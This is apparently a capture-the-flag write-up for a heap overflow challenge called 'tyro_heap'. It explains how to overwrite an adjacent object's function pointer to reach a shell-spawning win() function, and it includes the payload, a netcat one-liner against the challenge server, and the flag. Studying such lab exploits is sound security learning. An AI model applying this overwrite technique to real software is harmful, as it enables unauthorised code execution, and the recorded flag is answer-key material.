# tyro_heap (50 points)
*Solution by [Neg9] Javantea*

Files:
* tyro_heap_29d1e9341f35f395475bf16aa988e29b
* heap1.txt
* tyro_heap.jav
	
This challenge is a heap overflow. Heap overflows are complex and the writeups for how they work are pretty bad. I spent a half hour just figuring out the dynamics of the problem.

```
create heap object
create heap object
read type b into object 0
$'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x60\x86\x04\x08'
run object function 1
quit
```

What happens in this exploit is two simple allocations. They are up against one another. Then you read 40 bytes into the first object and the last 4 overwrites the object function of the second. Then when you call the object function of the second, you get code execution. They created a function called win() that executes a shell. I probably could have gotten code execution without that function but that would have been worth more than 50 points. Heap exploits are not as difficult as you might think.
	
```
(echo c; sleep 0.2; echo c; sleep 0.2; echo b; sleep 0.2; echo 0; sleep 0.2; echo $'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x60\x86\x04\x08'; sleep 0.5; echo e; sleep 0.2; echo 1; sleep 0.2; echo q; cat) |nc 172.31.1.35 1622

cat /home/challenge/flag
```

Solution:  
Chihui_you_got_a_heap_challenge_honaho
